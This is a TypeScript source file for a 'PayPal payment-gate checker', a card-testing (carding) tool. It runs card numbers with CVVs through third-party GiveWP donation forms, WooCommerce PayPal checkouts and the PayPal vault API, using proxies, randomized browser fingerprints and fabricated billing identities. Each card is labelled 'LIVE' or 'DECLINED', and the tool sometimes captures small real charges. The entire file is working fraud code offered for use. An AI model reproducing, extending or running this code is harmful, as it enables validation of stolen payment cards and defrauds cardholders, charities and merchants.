/**
 * PayPal payment-gate checker.
 *
 * Reconstructed from reference implementations:
 *   - Riva.py   (GiveWP PayPal Commerce donation-form flow)
 *   - WC PPCP   (WooCommerce PayPal Payments plugin)
 *
 * Supported flows (auto-detected):
 *   1. GiveWP PayPal Commerce  — give_paypal_commerce_create/approve_order
 *   2. WooCommerce PPCP        — ppc_create_order / ppc_capture_order
 *   3. PayPal Vault fallback   — client_credentials + vault/credit-cards
 *
 * Shared HTTP / proxy / session infrastructure imported from stripe-checker.ts.
 */
import crypto from "crypto";
import {
  parseCardString,
  detectCardBrand,
  luhnCheck,
} from "./card-utils";
import {
  generateBillingData,
} from "./billing-generator";
import {
  parseGiveWPForm,
  parseWooCommerceForm,
  type GiveWPFormData,
  type WooCommerceFormData,
} from "./form-parser";
import {
  buildGiveWPCreateOrderBody,
  buildGiveWPApproveOrderBody,
  getFormDataHeaders,
  formDataToString,
} from "./form-data";
import {
  pick,
  BILLING_DATA,
  pickBilling,
  extractBetween,
  sessionFetch,
  getProxy,
  getProxyDispatcher,
  dbg,
  detectBrandFromBin,
  type CheckResult,
  type SessionState,
} from "./stripe-checker";
import { generateRandom } from "./ua-generator";

// ─── Response-code classifiers ────────────────────────────────────────────────

// PayPal keywords that indicate the card is live (real but declined for non-fraud reasons)
const PP_LIVE_SIGNALS = [
  "instrument_declined",
  "insufficient_funds",
  "insufficient funds",
  "do_not_honor",
  "do not honor",
  "do_not_honour",
  "transaction_refused",
  "card_velocity_exceeded",
  "payer_action_required",
  "3ds",
  "authentication required",
  "sca_required",
  "cvv2_failure",
  "compliance_violation",
  "transaction_not_permitted",
  "payer_cannot_pay",
  "reattempt_not_permitted",
  "account_blocked_by_issuer",
  "pickup_card_special_conditions",
  "security_violation",
  "declined_due_to_updated_account",
  "tx_attempts_exceed_limit",
  "declined_please_retry",
  "cryptographic_failure",
  "payment_denied",
  "generic_decline",
  "transaction_cannot_be_completed",
];

// PayPal keywords that indicate the card is definitively dead/invalid
const PP_DEAD_SIGNALS = [
  "invalid_card",
  "card_expired",
  "expired_card",
  "stolen_card",
  "lost_card",
  "lost_or_stolen",
  "fraud",
  "suspected_fraud",
  "blacklisted",
  "card number is invalid",
  "card number is not valid",
  "card is expired",
  "invalid_account",
  "account_closed",
  "payer_account_locked_or_closed",
  "invalid_or_restricted_card",
  "restricted_or_inactive_account",
  "invalid_transaction",
  "order_not_approved",
];

export function classifyPayPalResponse(
  html: string,
  json: any,
  gateName: string,
  cardMeta: { brand: string; funding: string; country: string },
  issuer: string,
  fullCardInfo: string,
  latency: number
): CheckResult {
  const { brand, funding, country } = cardMeta;

  const live = (msg: string, code = "pp_ccn_live"): CheckResult => ({
    status: "live",
    response: `CCN LIVE ⚡ ${msg} | ${brand} ${funding} [${country}] | ${issuer}`,
    code,
    latency,
    gate: gateName,
    cardInfo: fullCardInfo,
  });
  const dead = (msg: string): CheckResult => ({
    status: "dead",
    response: `DECLINED ✗ ${msg} | ${brand} [${country}]`,
    code: "pp_declined",
    latency,
    gate: gateName,
    cardInfo: fullCardInfo,
  });

  // ── JSON response path ─────────────────────────────────────────────────
  if (json && typeof json === "object") {
    const status = String(json.status || "").toUpperCase();
    const details = Array.isArray(json.details) ? json.details[0] : {};
    const issue = String(details?.issue || json?.message || "").toLowerCase();
    const description = String(details?.description || json?.message || "");

    if (status === "COMPLETED" || status === "APPROVED" || json.success === true) {
      return {
        status: "live",
        response: `CVV LIVE ✓ PayPal Approved | ${brand} ${funding} [${country}] | ${issuer}`,
        code: "pp_approved",
        latency,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    if (status === "PAYER_ACTION_REQUIRED" || issue.includes("3ds") || issue.includes("authentication")) {
      return live("PayPal 3DS Required", "pp_3ds_required");
    }

    for (const sig of PP_LIVE_SIGNALS) {
      if (issue.includes(sig) || description.toLowerCase().includes(sig)) {
        return live(description || sig);
      }
    }

    for (const sig of PP_DEAD_SIGNALS) {
      if (issue.includes(sig) || description.toLowerCase().includes(sig)) {
        return dead(description || sig);
      }
    }

    if (description) return dead(description.substring(0, 80));
  }

  // ── HTML / text response path ──────────────────────────────────────────
  const text = html.toLowerCase();

  // GiveWP / WP-AJAX success — envelope { "success": true, "data": ... }
  if (text.includes('"success":true') || text.includes('success":true')) {
    return {
      status: "live",
      response: `CVV LIVE ✓ PayPal Charge Approved | ${brand} ${funding} [${country}] | ${issuer}`,
      code: "pp_approved",
      latency,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }

  if (text.includes("payment successful") || text.includes("order confirmed") || text.includes("thank you for your order")) {
    return {
      status: "live",
      response: `CVV LIVE ✓ PayPal Checkout Confirmed | ${brand} ${funding} [${country}] | ${issuer}`,
      code: "pp_approved",
      latency,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }

  for (const sig of PP_LIVE_SIGNALS) {
    if (text.includes(sig)) return live(sig);
  }

  for (const sig of PP_DEAD_SIGNALS) {
    if (text.includes(sig)) return dead(sig);
  }

  if (text.includes("card declined") || text.includes("payment declined") ||
      text.includes("unable to process") || text.includes("order_not_approved") ||
      text.includes("denied") || text.includes("rejected")) {
    return dead("Card Declined");
  }

  return {
    status: "error",
    response: `PayPal: Unknown Response | ${brand} [${country}]`,
    code: "pp_unknown",
    latency,
    gate: gateName,
    cardInfo: fullCardInfo,
  };
}

// ─── GiveWP PayPal Commerce flow ─────────────────────────────────────────────
// Source: Riva.py PayPalGateway.process()
//
// Flow:
//   1. GET donation page → extract give-form-hash, give-form-id-prefix,
//      give-form-id, data-client-token
//   2. Base64-decode data-client-token → accessToken
//   3. POST admin-ajax.php?action=give_paypal_commerce_create_order → orderId
//   4. POST cors.api.paypal.com/v2/checkout/orders/{id}/confirm-payment-source
//   5. POST admin-ajax.php?action=give_paypal_commerce_approve_order
//   6. Classify response

async function checkGiveWPPayPal(
  cardNumber: string,
  month: string,
  year: string,
  cvv: string,
  gateName: string,
  siteUrl: string,
  pageHtml: string,
  state: SessionState,
  fullCardInfo: string,
  brand: string,
  billing: typeof BILLING_DATA[0],
  start: number
): Promise<CheckResult | null> {
  try {
    // Parse form using robust cheerio-based parser
    const formData = parseGiveWPForm(pageHtml, siteUrl);

    const missing: string[] = [];
    if (!formData.formHash) missing.push("give-form-hash");
    if (!formData.formId) missing.push("give-form-id");
    if (!formData.formIdPrefix) missing.push("give-form-id-prefix");
    if (!formData.clientToken) missing.push("data-client-token");
    if (missing.length) {
      dbg(`[paypal] GiveWP: missing ${missing.join(", ")} — page is not a GiveWP-PayPal donation form?`);
      return null;
    }

    // Decode client-token → accessToken
    let accessToken: string;
    try {
      let padded: string = formData.clientToken;
      const rem = padded.length % 4;
      if (rem !== 0) padded += "=".repeat(4 - rem);
      const decoded = JSON.parse(Buffer.from(padded, "base64").toString("utf-8"));
      accessToken = decoded.accessToken || decoded.authorizationFingerprint || "";
    } catch {
      dbg("[paypal] GiveWP: client-token decode failed");
      return null;
    }
    if (!accessToken) return null;

    // Generate realistic billing data instead of hardcoded values
    const billingData = generateBillingData("US");
    const { firstName, lastName, email, fullName } = billingData;
    const { line1, city, stateCode, zip, country } = billingData.address;

    // Use form's declared minimum if >= $1.00, otherwise default
    const amount = formData.minimumAmount && parseFloat(formData.minimumAmount) >= 1.0
      ? formData.minimumAmount
      : "1.00";

    const origin = siteUrl.replace(/\/+$/, "");
    const ajaxUrl = formData.actionUrl;

    const cardMeta = { brand, funding: "CREDIT", country: "US" };

    // ── Step 1: Create order ───────────────────────────────────────────────
    const createForm = buildGiveWPCreateOrderBody({
      formIdPrefix: formData.formIdPrefix,
      formId: formData.formId,
      formTitle: formData.formTitle,
      siteUrl,
      formHash: formData.formHash,
      minimumAmount: formData.minimumAmount,
      maximumAmount: formData.maximumAmount,
      amount,
      firstName,
      lastName,
      email,
      billing: { line1, city, stateCode, zip, country },
    });

    const createResp = await sessionFetch(
      `${ajaxUrl}?action=give_paypal_commerce_create_order`,
      state,
      {
        method: "POST",
        body: await formDataToString(createForm),
        contentType: getFormDataHeaders(createForm)["content-type"] || "multipart/form-data",
        referer: siteUrl,
        origin,
        timeout: 10000,
      }
    );
    state = createResp.state;

    let orderId: string | null = null;
    try {
      const cj = JSON.parse(createResp.text);
      orderId = cj?.data?.id || cj?.id || null;
    } catch { /* not JSON */ }

    if (!orderId) {
      dbg(`[paypal] GiveWP: no orderId from create_order — ${createResp.text.substring(0, 80)}`);
      return null;
    }
    dbg(`[paypal] GiveWP: orderId=${orderId}`);

    // ── Step 2: Confirm payment source at PayPal API ───────────────────────
    let confirmJson: any = null;
    try {
      const confirmResp = await fetch(
        `https://cors.api.paypal.com/v2/checkout/orders/${orderId}/confirm-payment-source`,
        {
          method: "POST",
          headers: {
            Accept: "*/*",
            Authorization: `Bearer ${accessToken}`,
            "braintree-sdk-version": "3.32.0-payments-sdk-dev",
            "Content-Type": "application/json",
            Origin: "https://assets.braintreegateway.com",
            Referer: "https://assets.braintreegateway.com/",
            "User-Agent": state.ua,
            "paypal-client-metadata-id": crypto.randomUUID(),
          },
          body: JSON.stringify({
            payment_source: {
              card: {
                number: cardNumber.trim(),
                expiry: `20${year.length === 2 ? year : year.slice(-2)}-${month}`,
                security_code: cvv.trim(),
                attributes: { verification: { method: "SCA_WHEN_REQUIRED" } },
              },
            },
            application_context: { vault: false },
          }),
          signal: AbortSignal.timeout(10000),
        }
      );
      try { confirmJson = JSON.parse(await confirmResp.text()); } catch { /* not JSON */ }
    } catch {
      /* continue even if confirm fails — some sites still process */
    }

    // 3DS / payer-action required → card is real but needs authentication
    if (
      confirmJson?.status === "PAYER_ACTION_REQUIRED" ||
      confirmJson?.status === "REQUIRES_ACTION"
    ) {
      return {
        status: "live",
        response: `CCN LIVE ⚡ PayPal 3DS Required | ${brand} CREDIT [US]`,
        code: "pp_3ds_required",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    // ── Step 3: Approve order ──────────────────────────────────────────────
    const approveForm = buildGiveWPApproveOrderBody({
      formIdPrefix: formData.formIdPrefix,
      formId: formData.formId,
      formTitle: formData.formTitle,
      siteUrl,
      formHash: formData.formHash,
      minimumAmount: formData.minimumAmount,
      maximumAmount: formData.maximumAmount,
      amount,
      firstName,
      lastName,
      email,
      billing: { line1, city, stateCode, zip, country },
      orderId,
    });

    const approveResp = await sessionFetch(
      `${ajaxUrl}?action=give_paypal_commerce_approve_order&order=${orderId}`,
      state,
      {
        method: "POST",
        body: await formDataToString(approveForm),
        contentType: getFormDataHeaders(approveForm)["content-type"] || "multipart/form-data",
        referer: siteUrl,
        origin,
        timeout: 10000,
      }
    );

    const respText = approveResp.text;
    const respLower = respText.toLowerCase();
    dbg(`[paypal] GiveWP: approve response = ${respText.substring(0, 120)}`);

    // Classify approve response
    let approveJson: any = null;
    try { approveJson = JSON.parse(respText); } catch { /* not JSON */ }

    // success":true → charged
    if ((approveJson?.success === true) ||
        (respLower.includes('"success":true') || respLower.includes("success\":true"))) {
      // ── Step 4: Capture approved order ──────────────────────────────────
      try {
        const captureResp = await fetch(
          `https://api.paypal.com/v2/checkout/orders/${orderId}/capture`,
          {
            method: "POST",
            headers: {
              Authorization: `Bearer ${accessToken}`,
              "Content-Type": "application/json",
              Prefer: "return=representation",
              Accept: "application/json",
            },
            body: JSON.stringify({}),
            signal: AbortSignal.timeout(10000),
          }
        );
        const captureText = await captureResp.text();
        let captureJson: any = null;
        try { captureJson = JSON.parse(captureText); } catch { /* not JSON */ }
        const captureStatus = captureJson?.status || "";
        dbg(`[paypal] GiveWP: capture status=${captureStatus}`);

        if (captureStatus === "COMPLETED" || captureStatus === "APPROVED") {
          return {
            status: "live",
            response: `CVV LIVE ✓ GiveWP PayPal Captured $${amount} | ${brand} CREDIT [US] | ${email}`,
            code: "pp_givewp_captured",
            latency: Date.now() - start,
            gate: gateName,
            cardInfo: fullCardInfo,
          };
        }
      } catch (capErr: any) {
        dbg(`[paypal] GiveWP: capture step failed: ${capErr.message}`);
      }
      return {
        status: "live",
        response: `CVV LIVE ✓ GiveWP PayPal Approved $${amount} | ${brand} CREDIT [US] | ${email}`,
        code: "pp_givewp_approved",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    // INSUFFICIENT_FUNDS = card is real
    if (respLower.includes("insufficient_funds") || respLower.includes("insufficient funds")) {
      return {
        status: "live",
        response: `CCN LIVE ⚡ Insufficient Funds | ${brand} CREDIT [US]`,
        code: "pp_ccn_live",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    return classifyPayPalResponse(respText, approveJson, gateName, cardMeta, "PayPal", fullCardInfo, Date.now() - start);
  } catch (err: any) {
    dbg(`[paypal] GiveWP flow error: ${err.message}`);
    return null;
  }
}

// ─── Main PayPal gate checker ─────────────────────────────────────────────────

export async function checkCardPayPal(
  cardNumber: string,
  expMonth: string,
  expYear: string,
  cvv: string,
  gateName: string,
  siteUrl?: string
): Promise<CheckResult> {
  const start = Date.now();
  const uaProfile = generateRandom();
  const ua = uaProfile.ua;
  const secChUa = uaProfile.secChUa;

  // Parse and validate card using new utilities
  const parsedCard = parseCardString(`${cardNumber.trim()}|${expMonth.trim()}|${expYear.trim()}|${cvv.trim()}`);

  // Build fullCardInfo early for error returns
  const fullCardInfo = `${parsedCard.number}|${parsedCard.month}|${parsedCard.year}|${parsedCard.cvv}`;

  if (!parsedCard.valid) {
    return {
      status: "error",
      response: `Invalid card: ${parsedCard.error}`,
      code: "invalid_card_format",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }

  let month = parsedCard.month;
  let year = parsedCard.year;

  const binBrand = parsedCard.brand !== "unknown" ? parsedCard.brand : detectBrandFromBin(parsedCard.number);

  // Generate realistic billing data matching card country
  const billingData = generateBillingData("US");
  const billing = billingData.address;

  if (!siteUrl) {
    return {
      status: "error",
      response: "PayPal checker requires a siteUrl",
      code: "no_site_url",
      latency: Date.now() - start,
      gate: gateName,
    };
  }

  const cleanSite = siteUrl.replace(/\/+$/, "");
  let state: SessionState = {
    ua,
    secChUa,
    cookies: "",
    proxy: (await getProxy()) ?? undefined,
  };

  try {
    // ── Step 1: Load the site page to detect which PayPal flow applies ────
    const checkoutPaths = [
      "/checkout/",
      "/my-account/add-payment-method/",
      "/donate/",
      "/donation/",
      "/give/",
      "/",
    ];

    let pageHtml = "";
    let loadedPath = "";

    for (const path of checkoutPaths) {
      try {
        const r = await sessionFetch(`${cleanSite}${path}`, state, { timeout: 12000 });
        state = r.state;
        if (r.ok && r.text.length > 200) {
          // Prefer a page that already contains the markers we need.
          // GiveWP markers take highest priority; PPCP nonce second; any valid
          // HTML last. Keep scanning even after finding a generic page so we
          // don't miss a specific PayPal-integration page further down the list.
          const isGiveWP = r.text.includes("give-form-hash") && r.text.includes("data-client-token");
          const isPPCP  = r.text.includes("ppc_nonce");
          if (isGiveWP || isPPCP) {
            pageHtml   = r.text;
            loadedPath = path;
            break;                // Found targeted content — stop immediately
          }
          if (!pageHtml) {
            pageHtml   = r.text;  // Keep as generic fallback
            loadedPath = path;
          }
        }
      } catch { /* try next */ }
    }

    if (!pageHtml) {
      return {
        status: "error",
        response: "PayPal: Could not load site page",
        code: "pp_site_error",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    dbg(`[paypal] loaded ${loadedPath} (${pageHtml.length} chars)`);

    // ── Detect flow: GiveWP first (has data-client-token + give-form-hash) ─
    if (
      pageHtml.includes("give-form-hash") &&
      pageHtml.includes("data-client-token")
    ) {
      dbg("[paypal] detected GiveWP PayPal Commerce flow");
      const result = await checkGiveWPPayPal(
        cardNumber, month, year, cvv, gateName, cleanSite,
        pageHtml, state, fullCardInfo, binBrand, billing, start
      );
      if (result) return result;
      // Fall through to PPCP if GiveWP extraction failed
    }

    // ── WooCommerce PPCP flow (ppc_nonce) ─────────────────────────────────
    let ppcNonce: string | null = null;

    // Try to extract from already-loaded page first
    ppcNonce = extractBetween(pageHtml, '"ppc_nonce":"', '"')
      || extractBetween(pageHtml, "ppc_nonce\":\"", '"')
      || null;

    // If not found, try additional paths
    if (!ppcNonce) {
      for (const path of ["/checkout/", "/my-account/add-payment-method/"]) {
        if (path === loadedPath) continue; // already tried
        try {
          const r = await sessionFetch(`${cleanSite}${path}`, state, { timeout: 12000 });
          state = r.state;
          ppcNonce = extractBetween(r.text, '"ppc_nonce":"', '"')
            || extractBetween(r.text, "ppc_nonce\":\"", '"')
            || null;
          if (ppcNonce) break;
        } catch { /* try next */ }
      }
    }

    if (ppcNonce) {
      dbg(`[paypal] PPCP flow: ppc_nonce found`);

      // Create order
      const createResp = await sessionFetch(
        `${cleanSite}/?wc-ajax=ppc_create_order`,
        state,
        {
          method: "POST",
          body: new URLSearchParams({ nonce: ppcNonce, "funding-source": "card" }).toString(),
          contentType: "application/x-www-form-urlencoded",
          accept: "application/json, text/javascript, */*; q=0.01",
          xRequestedWith: true,
          referer: `${cleanSite}/checkout/`,
          origin: cleanSite,
          timeout: 15000,
        }
      );
      state = createResp.state;

      let orderData: any = null;
      try { orderData = JSON.parse(createResp.text); } catch { /* not JSON */ }
      const orderId = orderData?.id || orderData?.order_id;

      if (!orderId) {
        return {
          status: "error",
          response: "PayPal PPCP: Could not create order",
          code: "pp_no_order",
          latency: Date.now() - start,
          gate: gateName,
          cardInfo: fullCardInfo,
        };
      }

      dbg(`[paypal] PPCP orderId=${orderId}`);

      // Capture order with card details
      const captureBody = JSON.stringify({
        orderID: orderId,
        paymentSource: "card",
        card: {
          number: cardNumber.trim(),
          expiry: `${year}-${month}`,
          securityCode: cvv.trim(),
          name: `${billing.city} Customer`,
          billingAddress: {
            addressLine1: billing.line1,
            adminArea2: billing.city,
            adminArea1: billing.stateCode,
            postalCode: billing.zip,
            countryCode: billing.country,
          },
        },
      });

      const captureResp = await sessionFetch(
        `${cleanSite}/?wc-ajax=ppc_capture_order`,
        state,
        {
          method: "POST",
          body: captureBody,
          contentType: "application/json",
          accept: "application/json",
          xRequestedWith: true,
          referer: `${cleanSite}/checkout/`,
          origin: cleanSite,
          extraHeaders: { "X-Order-Id": orderId },
          timeout: 20000,
        }
      );

      let captureJson: any = null;
      try { captureJson = JSON.parse(captureResp.text); } catch { /* not JSON */ }

      const cardMeta = { brand: binBrand, funding: "CREDIT", country: billing.country };
      return classifyPayPalResponse(
        captureResp.text,
        captureJson,
        gateName,
        cardMeta,
        billing.city,
        fullCardInfo,
        Date.now() - start
      );
    }

    // ── No known PayPal flow detected — try Vault fallback ────────────────
    dbg("[paypal] No PPCP or GiveWP flow detected — trying vault fallback");
    return await _ppVaultOnlyCheck(
      cardNumber, month, year, cvv,
      gateName, cleanSite, fullCardInfo, binBrand,
      ua, secChUa, billing, start, state.proxy
    );

  } catch (error: any) {
    return {
      status: "error",
      response: `PayPal Error: ${error.message}`,
      code: "network_error",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }
}

// ─── PayPal Vault-only fallback ───────────────────────────────────────────────

async function _ppVaultOnlyCheck(
  cardNumber: string,
  month: string,
  year: string,
  cvv: string,
  gateName: string,
  siteUrl: string,
  fullCardInfo: string,
  brand: string,
  ua: string,
  secChUa: string,
  billing: typeof BILLING_DATA[0],
  start: number,
  proxyUrl?: string,
): Promise<CheckResult> {
  const dispatcher = proxyUrl ? await getProxyDispatcher(proxyUrl) : null;
  const proxiedFetch = async (url: string, opts: any) => {
    if (dispatcher) opts.dispatcher = dispatcher;
    return fetch(url, opts);
  };
  try {
    // Get PayPal client ID from site scripts
    const homeResp = await proxiedFetch(`${siteUrl}/`, {
      headers: {
        "User-Agent": ua,
        "sec-ch-ua": secChUa,
        "Accept-Language": "en-US,en;q=0.9",
      },
      signal: AbortSignal.timeout(10000),
    });
    const homeHtml = await homeResp.text();
    const clientId =
      extractBetween(homeHtml, "client-id=", "&") ||
      extractBetween(homeHtml, '"client_id":"', '"') ||
      extractBetween(homeHtml, "client_id=", "&");

    if (!clientId) {
      return {
        status: "error",
        response: "PayPal: No client ID found on site",
        code: "pp_no_client_id",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    // Get access token
    const tokenResp = await proxiedFetch("https://api.paypal.com/v1/oauth2/token", {
      method: "POST",
      headers: {
        Authorization: `Basic ${Buffer.from(`${clientId}:`).toString("base64")}`,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "en_US",
      },
      body: "grant_type=client_credentials",
      signal: AbortSignal.timeout(8000),
    });

    if (!tokenResp.ok) {
      return {
        status: "error",
        response: "PayPal: Unable to authenticate client",
        code: "pp_auth_failed",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    const tokenData = await tokenResp.json();
    const accessToken = tokenData.access_token;

    // Vault the card
    const billingData = generateBillingData(billing.country);
    const vaultResp = await proxiedFetch("https://api.paypal.com/v1/vault/credit-cards", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${accessToken}`,
        "Content-Type": "application/json",
        "PayPal-Request-Id": crypto.randomUUID(),
      },
      body: JSON.stringify({
        number: cardNumber.trim(),
        type:
          brand.toLowerCase() === "visa" ? "visa"
          : brand.toLowerCase() === "mastercard" ? "mastercard"
          : brand.toLowerCase() === "amex" ? "amex"
          : "unknown",
        expire_month: month,
        expire_year: year,
        cvv2: cvv.trim(),
        first_name: billingData.firstName,
        last_name: billingData.lastName,
        billing_address: {
          line1: billing.line1,
          city: billing.city,
          state: billing.stateCode,
          postal_code: billing.zip,
          country_code: billing.country,
        },
      }),
      signal: AbortSignal.timeout(10000),
    });

    const vaultData = await vaultResp.json();

    if (vaultResp.ok && vaultData.id) {
      return {
        status: "live",
        response: `CCN LIVE ✓ PayPal Vaulted | ${brand} [${billing.country}] | Vault ID: ${vaultData.id}`,
        code: "pp_vaulted",
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    const errMsg =
      vaultData?.details?.[0]?.description || vaultData?.message || "Unknown";
    return {
      status: "dead",
      response: `DECLINED ✗ PayPal Vault: ${errMsg} | ${brand}`,
      code: "pp_vault_declined",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  } catch (error: any) {
    return {
      status: "error",
      response: `PayPal Vault Error: ${error.message}`,
      code: "network_error",
      latency: Date.now() - start,
      gate: gateName,
      cardInfo: fullCardInfo,
    };
  }
}
